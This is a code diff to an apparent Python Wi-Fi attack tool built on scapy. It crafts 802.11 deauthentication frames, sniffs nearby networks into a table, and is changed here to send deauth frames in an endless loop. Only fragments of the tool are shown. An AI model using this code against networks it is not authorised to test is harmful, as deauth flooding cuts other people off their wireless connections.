@@ -2,7 +2,7 @@
 
 from scapy.all import *
 from threading import Thread
-# from .begin import execute_commands
+from .begin import execute_commands
 from prettytable import PrettyTable
 import netifaces
 
@@ -35,13 +35,8 @@ class Deauth:
         packet = RadioTap()/dot11/Dot11Deauth(reason=7)
         return packet
 
-    def send_packet(self, packet, interface, counts):
-        if counts == 0:
-            loop = 1
-            counts = None
-        else:
-            loop = 0
-        sendp(packet, inter=0.1, count=counts, loop=loop, iface=interface, verbose=0)
+    def send_packet(self, packet, interface):
+        sendp(packet, inter=0.1, count=None, loop=1, iface=interface, verbose=0)
     
 class Dump:
     def __init__(self):
@@ -90,8 +85,16 @@ class Dump:
         sniff(prn=self.callback, iface=interface, timeout=timeout)
         dead = True
 		# print(self.networks)
-        x = PrettyTable()
-        x.field_names = ["No", "BSSID", "SSID", "PWR", "CH", "ENC"]
+        no = 1
         for key, value in self.dictionary.items():
-            x.add_row(value)
-        return x
+            value.insert(0, no)
+            no += 1
+        return self.dictionary
+
+    @staticmethod
+    def make_table(data):
+        table = PrettyTable()
+        table.field_names = ["NO", "BSSID", "SSID", "PWR", "CH", "ENC"]
+        for k, v in data.items():
+            table.add_row(v)
+        return table    
